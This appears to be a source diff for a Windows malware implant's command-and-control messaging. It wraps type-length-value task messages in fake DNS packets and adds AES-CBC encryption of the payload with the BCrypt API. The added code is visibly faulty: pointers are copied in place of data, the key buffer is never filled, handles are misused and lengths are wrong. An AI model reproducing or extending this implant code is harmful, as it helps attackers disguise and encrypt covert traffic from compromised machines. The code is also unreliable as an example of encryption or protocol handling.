@@ -76,11 +76,15 @@ static BOOL RecvAll(SOCKET sock, CHAR* buf, INT len)
 
 BOOL SendTlvMessage(SOCKET sock, USHORT taskId, DWORD type, DWORD payloadLength, CONST PBYTE payload)
 {
-	PBYTE msg = ImplantHeapAlloc(DNS_HEADER_SIZE + payloadLength);
+	PBYTE msg = ImplantHeapAlloc(TLV_HEADER_SIZE + payloadLength);
 
 	ASSERT(sock != INVALID_SOCKET);
 
-	EncodeDNS(msg, taskId, type, &payloadLength, payload);
+	memcpy(msg + TLV_TYPE_FIELD_OFFSET, &type, sizeof(DWORD));
+	memcpy(msg + TLV_LENGTH_FIELD_OFFSET, &payloadLength, sizeof(DWORD));
+	memcpy(msg + TLV_LENGTH_FIELD_OFFSET + sizeof(DWORD), &payload, payloadLength);
+
+	EncodeDNS(&msg, taskId, type, &payloadLength, payload);
 
 	if (!SendAll(sock, (CONST CHAR*)msg, payloadLength))
 	{
@@ -154,7 +158,7 @@ VOID FreeTlvMessage(TLV_MESSAGE* msg)
 	}
 }
 
-BOOL EncodeDNS(PBYTE msg, USHORT taskId, DWORD type, DWORD* payloadLength, CONST PBYTE payload)
+BOOL EncodeDNS(PBYTE* msg, USHORT taskId, DWORD type, DWORD* payloadLength, PBYTE payload)
 {
 	USHORT length, dummyAnswer, dummyAuthority, dummyAdditional;
 	dummyAnswer = 0;
@@ -170,6 +174,8 @@ BOOL EncodeDNS(PBYTE msg, USHORT taskId, DWORD type, DWORD* payloadLength, CONST
 	memcpy(msg + DNS_AUTHORITY_OFFSET, &dummyAuthority, sizeof(USHORT));
 	memcpy(msg + DNS_ADDITIONAL_OFFSET, &dummyAdditional, sizeof(USHORT));
 
+	Encrypt(&payload, *payloadLength + TLV_HEADER_SIZE);
+
 	memcpy(msg + DNS_HEADER_SIZE, payload, *payloadLength);
 
 	*payloadLength = (DWORD)(length + DNS_HEADER_SIZE);
@@ -181,3 +187,49 @@ BOOL EncodeDNS(PBYTE msg, USHORT taskId, DWORD type, DWORD* payloadLength, CONST
 {
 
 }*/
+
+BOOL Encrypt(PBYTE* msg, DWORD msgLength) {
+	BCRYPT_ALG_HANDLE hAlg = NULL;
+	BCRYPT_KEY_HANDLE hKey = NULL;
+	NTSTATUS status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
+	BYTE pbKey[KEY_SIZE];
+	DWORD cbKey = KEY_SIZE;
+	PBYTE buff = ImplantHeapAlloc(KEY_BUFF_SIZE);
+	DWORD cbCiphertext = 0;
+	DWORD cbDataRet = 0;
+	PBYTE temp = *msg;
+	ULONG sizeRequired = 0;
+
+	if (status != STATUS_SUCCESS)
+	{
+		return FALSE;
+	}
+
+	status = BCryptSetProperty(
+		hAlg,
+		BCRYPT_CHAINING_MODE,
+		(PBYTE)BCRYPT_CHAIN_MODE_CBC,
+		sizeof(BCRYPT_CHAIN_MODE_CBC),
+		0);
+	if (status != STATUS_SUCCESS)
+	{
+		return FALSE;
+	}
+
+	status = BCryptImportKey(hAlg, NULL, BCRYPT_KEY_DATA_BLOB, hKey, NULL, 0, buff, KEY_BUFF_SIZE, 0);
+	if (status != STATUS_SUCCESS)
+	{
+		return FALSE;
+	}
+
+	status = BCryptEncrypt(hKey, temp, msgLength, NULL, NULL, 0, NULL, 0, &sizeRequired, BCRYPT_BLOCK_PADDING);
+	*msg = ImplantHeapAlloc(sizeRequired);
+	status = BCryptEncrypt(hKey, temp, msgLength, NULL, NULL, 0, *msg, sizeRequired, &sizeRequired, BCRYPT_BLOCK_PADDING);
+	if (status != STATUS_SUCCESS)
+	{
+		return FALSE;
+	}
+	ImplantHeapFree(temp);
+
+	return TRUE;
+}
